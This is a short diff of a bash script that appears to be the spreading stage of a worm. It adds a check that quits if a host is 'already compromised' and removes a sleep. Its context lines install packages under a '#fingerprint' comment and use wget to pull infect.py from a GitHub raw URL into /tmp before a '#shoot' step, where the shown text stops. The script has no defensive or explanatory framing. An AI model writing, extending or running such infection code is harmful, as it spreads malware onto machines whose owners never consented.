@@ -1,5 +1,8 @@
 #!/bin/bash
-
+# cehck if system not already compromised, in future, check for package
+if [ -e /tmp/infect.py ]
+then exit
+fi 
 #fingerprint
 apt-get update
 apt-get install python3 -y
@@ -9,7 +12,6 @@ apt-get install net-tools -y
 
 #download infect
 wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py
-sleep 3
 
 #shoot
 cd /usr/bin
